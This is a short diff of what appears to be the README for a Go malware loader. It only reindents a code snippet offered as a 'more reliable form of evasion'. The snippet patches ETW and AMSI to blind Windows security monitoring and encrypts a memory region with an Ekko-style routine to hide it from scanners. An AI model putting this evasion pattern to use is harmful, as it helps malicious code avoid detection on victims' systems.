@@ -45,29 +45,29 @@ go build -ldflags="-w -s" -trimpath -o loader.exe
 ## use this pattern for a more reliable form of evasion
 
 ```go
-    // import pkg/net and pkg/patch
-    patch.ETW
-    patch.AMSI
-	addr, size, err := net.GetGlobalBufferRegion()
-	if err != nil {
-		log.Fatalf("[ERROR] Failed to get global buffer region: %v\n", err)
-	}
+// import pkg/net and pkg/patch
+patch.ETW
+patch.AMSI
+addr, size, err := net.GetGlobalBufferRegion()
+if err != nil {
+	log.Fatalf("[ERROR] Failed to get global buffer region: %v\n", err)
+}
 
-	key, err := ekko.GenerateKey(16)
-	if err != nil {
-		log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
-	}
+key, err := ekko.GenerateKey(16)
+if err != nil {
+	log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
+}
 
-	err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
-	if err != nil {
-		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
-	}
+err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
+if err != nil {
+	log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
+}
 
-	// we just call it again to decrypt bc symmetric 
-	err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
-	if err != nil {
-		log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
-	}
+// we just call it again to decrypt bc symmetric 
+err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
+if err != nil {
+	log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
+}
 
 ```
 
